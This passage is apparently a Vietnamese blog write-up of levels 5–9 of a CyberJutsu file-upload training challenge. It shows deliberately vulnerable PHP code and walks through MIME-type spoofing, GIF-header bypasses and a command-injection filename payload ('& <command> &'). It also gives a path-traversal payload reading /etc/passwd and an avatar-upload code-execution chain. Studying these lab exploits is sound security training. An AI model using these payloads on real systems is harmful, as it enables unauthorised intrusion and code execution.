data-proofer-ignore></p><hr /><h2 id="level-5"><span class="mr-2">Level 5</span><a href="#level-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Source code level 5:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Create folder for each user</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'upload/'</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">)</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="p">[</span><span class="s2">"image/jpeg"</span><span class="p">,</span> <span class="s2">"image/png"</span><span class="p">,</span> <span class="s2">"image/gif"</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"Hack detected"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$file</span><span class="p">);</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="s1">'Successfully uploaded file at: &lt;a href="/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">'"&gt;/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">' &lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Đoạn code thực hiện check <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME type</a> của file được upload lên, nếu không là 1 trong 3 kiểu <code class="language-plaintext highlighter-rouge">"image/jpeg", "image/png", "image/gif"</code> thì chương trình sẽ dừng và in ra màn hình chuỗi “Hack detected”</p><p>Sử dụng Burp Suite để bắt POST request upload file</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2015.png" alt="Untitled" data-proofer-ignore></p><p>Chỉnh sửa Content-Type thành <code class="language-plaintext highlighter-rouge">image/gif</code> và gửi lại request, ta thấy trang web thông báo upload thành công</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2016.png" alt="Untitled" data-proofer-ignore></p><p>Truy cập url chứa file đã upload</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2017.png" alt="Untitled" data-proofer-ignore></p><h2 id="level-6"><span class="mr-2">Level 6</span><a href="#level-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Soure code level 6:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

    <span class="c1">// Create folder for each user</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'upload/'</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">)</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

    <span class="nv">$error</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="nv">$success</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="no">FILEINFO_MIME_TYPE</span><span class="p">);</span>
            <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
            <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"image/jpeg"</span><span class="p">,</span> <span class="s2">"image/png"</span><span class="p">,</span> <span class="s2">"image/gif"</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">,</span> <span class="kc">TRUE</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"Hack detected"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$file</span><span class="p">);</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="s1">'Successfully uploaded file at: &lt;a href="/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">'"&gt;/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">' &lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Đoạn code sử dụng hàm <a href="https://www.php.net/manual/en/function.finfo-file.php">finfo_file</a> để lấy <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME type</a> của file, sau đó check xem có trong whitelist đã được khai báo trước không, nếu không có trong whitelist định trước chương trình sẽ dừng và in ra chuỗi “Hack detected”</p><p>Bypass bằng cách thêm header của file gif vào trước đoạn code php</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2018.png" alt="Untitled" data-proofer-ignore></p><p>Bypass và upload file thành công</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2019.png" alt="Untitled" data-proofer-ignore></p><p>Truy cập url của file đã upload</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2020.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2021.png" alt="Untitled" data-proofer-ignore></p><h2 id="level-7"><span class="mr-2">Level 7</span><a href="#level-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Ở level này, trang web cho phép người dùng upload 1 file nén, phía backend của trang web sẽ unzip (giải nén) và lưu vào folder cho người dùng</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2022.png" alt="Untitled" data-proofer-ignore></p><p>Tiến hành upload thử một file</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2023.png" alt="Untitled" data-proofer-ignore></p><p>Mình chú ý đến câu lệnh để unzip file được in phía dưới, tên file sẽ được đưa vào một câu lệnh để giải nén file, và tên file là do phía người dùng cung cấp nên chúng ta có thể chỉnh sửa tên file để khai thác lỗ hổng OS Command Injection</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nc">Unzipper</span> <span class="n">command</span><span class="o">:</span> <span class="n">unzip</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="mi">616609</span><span class="n">e23f10f16ea1ff8e114b4974c3</span><span class="o">/</span><span class="n">e66ea8344f034964ba0b3cb9879996ff</span><span class="mf">.</span><span class="n">tar</span> <span class="o">-</span><span class="n">d</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="mi">616609</span><span class="n">e23f10f16ea1ff8e114b4974c3</span>
</pre></table></code></div></div><p>Thực hiện bắt post request upload file và chỉnh sửa tên file thành <code class="language-plaintext highlighter-rouge">ten_file &amp; &lt;command&gt; &amp;</code> .Payload <code class="language-plaintext highlighter-rouge">&amp; &lt;command&gt; &amp;</code> với <code class="language-plaintext highlighter-rouge">&amp;</code> là một toán tử câu lệnh trong linux với mục đích chạy ngầm 1 câu lệnh. Thay command = echo hell, ta thấy trang web trả về chuỗi “hell”</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2024.png" alt="Untitled" data-proofer-ignore></p><p>Thay command thành <code class="language-plaintext highlighter-rouge">whoami</code> , trang web trả về www-data</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2025.png" alt="Untitled" data-proofer-ignore></p><hr /><h2 id="level-8"><span class="mr-2">Level 8</span><a href="#level-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'game'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /?game=fatty-bird-1.html'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$game</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'game'</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'./views/header.html'</span><span class="p">;</span> <span class="cp">?&gt;</span>
    <span class="nt">&lt;/head&gt;</span>

    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"navbar navbar-expand-lg navbar-light bg-light"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"?game=fatty-bird-1.html&amp;debug"</span><span class="nt">&gt;</span>Debug source<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/nav&gt;</span>
        <span class="nt">&lt;br&gt;&lt;br&gt;</span>
        <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"display-4 text-center"</span><span class="nt">&gt;</span>File upload workshop<span class="nt">&lt;/h3&gt;</span>
        <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"display-4 text-center"</span><span class="nt">&gt;</span>Level 8<span class="nt">&lt;/h4&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"display-5 text-center"</span><span class="nt">&gt;</span>Goal: read /etc/passwd<span class="nt">&lt;/p&gt;</span>

        <span class="nt">&lt;br&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background-color: white; padding: 20px;"</span><span class="nt">&gt;</span>
            <span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'./views/'</span> <span class="mf">.</span> <span class="nv">$game</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;/body&gt;</span>

    <span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'./views/footer.html'</span> <span class="cp">?&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Đoạn code trên thực hiện lấy GET parameter “game” và truyền vào phần dưới của trang web:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> <span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'./views/'</span> <span class="mf">.</span> <span class="nv">$game</span><span class="p">;</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Đây là lỗi <strong>Path Traversal</strong>, như quan sát thấy, chúng ta đang ở thư mục views, là thư mục con của /var/www/html/ (Thư mục default của apache) vì vậy cần sử dụng 4 lần <code class="language-plaintext highlighter-rouge">../</code> để về thư mục gốc của hệ điều hành, sau đó truy cập /etc/passwd</p><p><strong>Payload: <code class="language-plaintext highlighter-rouge">../../../../etc/passwd</code></strong></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2026.png" alt="Untitled" data-proofer-ignore></p><hr /><h2 id="level-9"><span class="mr-2">Level 9</span><a href="#level-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Source code của phần game:</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2027.png" alt="Untitled" data-proofer-ignore></p><p>Tương tự như lv 8, lv 9 cũng dính lỗi <strong>Path Traversal</strong></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2028.png" alt="Untitled" data-proofer-ignore></p><p>Trang Profile có chức năng upload avatar người chơi</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2029.png" alt="Untitled" data-proofer-ignore></p><p>Upload file hehe.php với nội dung</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2030.png" alt="Untitled" data-proofer-ignore></p><p>Ta thấy trang web không hề filter file php</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2031.png" alt="Untitled" data-proofer-ignore></p><p>Truy cập file avatar từ trang Hall of fame, ta thấy tên file đã được đổi thành avatar.jpg và code php không được thực thi</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2032.png" alt="Untitled" data-proofer-ignore></p><p>Check file source code của trang profile, ta thấy đường dẫn lưu file avatar do người dùng upload lên là <code class="language-plaintext highlighter-rouge">/usr/upload</code></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2033.png" alt="Untitled" data-proofer-ignore></p><p>Sử dụng Path Traversal để truy cập đến avatar của bản thân, ta thấy câu lệnh <code class="language-plaintext highlighter-rouge">whoami</code> được thực thi và in ra kết quả</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2034.png" alt="Untitled" data-proofer-ignore></p><p><strong><em>Shout out to CyberJutsu vì challenge chất lượng ❤️</em></strong></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/upload-file/" class="post-tag no-text-decoration" >upload_file</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CyberJutsu+Upload+File+Challenge+-+Domiee13&url=https%3A%2F%2Fdomiee13.github.io%2Fposts%2FCyberJutsuUploadFile%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CyberJutsu+Upload+File+Challenge+-+Domiee13&u=https%3A%2F%2Fdomiee13.github.io%2Fposts%2FCyberJutsuUploadFile%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdomiee13.github.io%2Fposts%2FCyberJutsuUploadFile%2F&text=CyberJutsu+Upload+File+Challenge+-+Domiee13" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PTIT-SVATTT-2023/">Writeup CTF Tuyển chọn SVATT PTIT 2023</a><li><a href="/posts/WhiteHat11/">WhiteHat Play 11 Writeup</a><li><a href="/posts/Bugbounty/">Đừng chơi Bug bounty, chạy, chạy ngay đi!!</a><li><a href="/posts/In4DisclosureLabs/">Information Disclosure Labs</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hello/">hello</a> <a class="post-tag" href="/tags/information-disclosure/">information_disclosure</a> <a class="post-tag" href="/tags/bug-bounty/">bug_bounty</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/php-object-injection/">php_object_injection</a> <a class="post-tag" href="/tags/portswigger/">portswigger</a> <a class="post-tag" href="/tags/upload-file/">upload_file</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/XSSBasic/"><div class="card-body"> <em class="timeago small" data-ts="1646665200" > 2022-03-07 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>XSS level mẫu giáo xD</h3><div class="text-muted small"><p> XSS level mẫu giáo xD Writeup của mình về 1 bài trên tryhackme.com, gồm 6 level Level 1 Xem qua trang web Nhập tên vào ô input, tên nhập vào sẽ được hiển thị với câu chào Source code Nh...</p></div></div></a></div><div class="card"> <a href="/posts/DCTF22Seek/"><div class="card-body"> <em class="timeago small" data-ts="1650373200" > 2022-04-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DCTF22 - Seek</h3><div class="text-muted small"><p> Seek File seek.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; int oops(){ printf(&quot;oops this wasn&#39;t the char I was looking for\n&quot;); exit(1); return 0; } int main () { FILE *fp...</p></div></div></a></div><div class="card"> <a href="/posts/PHPObjInjection/"><div class="card-body"> <em class="timeago small" data-ts="1652932800" > 2022-05-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PHP Object Injection BlueCyber</h3><div class="text-muted small"><p> PHP Object Injection BlueCyber Lab1 Source code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/DCTF22Seek/" class="btn btn-outline-primary" prompt="Older"><p>DCTF22 - Seek</p></a> <a href="/posts/PHPObjInjection/" class="btn btn-outline-primary" prompt="Newer"><p>PHP Object Injection BlueCyber</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "domiee13/domiee13.github.io", "data-repo-id": "R_kgDOHGGQmA", "data-category": "Q&A", "data-category-id": "DIC_kwDOHGGQmM4COWS7", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/domiee13">Nguyen Tran Tuan Dung</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hello/">hello</a> <a class="post-tag" href="/tags/information-disclosure/">information_disclosure</a> <a class="post-tag" href="/tags/bug-bounty/">bug_bounty</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/php-object-injection/">php_object_injection</a> <a class="post-tag" href="/tags/portswigger/">portswigger</a> <a class="post-tag" href="/tags/upload-file/">upload_file</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
